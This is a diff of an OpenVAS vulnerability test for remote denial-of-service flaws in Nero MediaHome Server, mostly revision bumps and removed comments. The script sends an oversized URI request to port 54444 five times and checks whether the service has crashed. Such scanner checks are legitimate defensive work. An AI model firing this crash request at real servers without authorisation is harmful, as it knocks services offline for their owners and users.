@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_nero_mediahome_server_mult_dos_vuln.nasl 6698 2017-07-12 12:00:17Z cfischer $
+# $Id: gb_nero_mediahome_server_mult_dos_vuln.nasl 11103 2018-08-24 10:37:26Z mmartin $
 #
 # Nero MediaHome Server Multiple Remote DoS Vulnerabilities
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803150");
-  script_version("$Revision: 6698 $");
+  script_version("$Revision: 11103 $");
   script_cve_id("CVE-2012-5876", "CVE-2012-5877");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 12:37:26 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-01-10 14:19:03 +0530 (Thu, 10 Jan 2013)");
   script_name("Nero MediaHome Server Multiple Remote DoS Vulnerabilities");
 
@@ -39,10 +39,7 @@ if(description)
   vulnerabilities.");
   script_tag(name:"vuldetect", value:"This test works by sending a big size request to the target
   service listening on port 54444/TCP and checking that  the target service is dead.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
   script_tag(name:"affected", value:"Nero MediaHome Server version 4.5.8.100 and prior");
   script_tag(name:"insight", value:"Multiple flaws are due to improper handling of the URI length,
   HTTP OPTIONS method length, HTTP HEAD request, HTTP REFERER and HTTP HOST header
@@ -75,22 +72,13 @@ if(description)
 
 include("http_func.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-port = 0;
-banner = "";
-
-## Get HTTP Port
 port = get_http_port(default:54444);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if(!banner || "Nero-MediaHome/" >!< banner){
   exit(0);
 }
 
-## Construct attack request
 req = http_get(item:string("/A",crap(500000)), port:port);
 
 for(i=0; i<5; i++)
@@ -101,7 +89,6 @@ for(i=0; i<5; i++)
 
 sleep(2);
 
-## Confirm HTTP Server is dead
 if(http_is_dead(port:port)){
   security_message(port);
   exit(0);
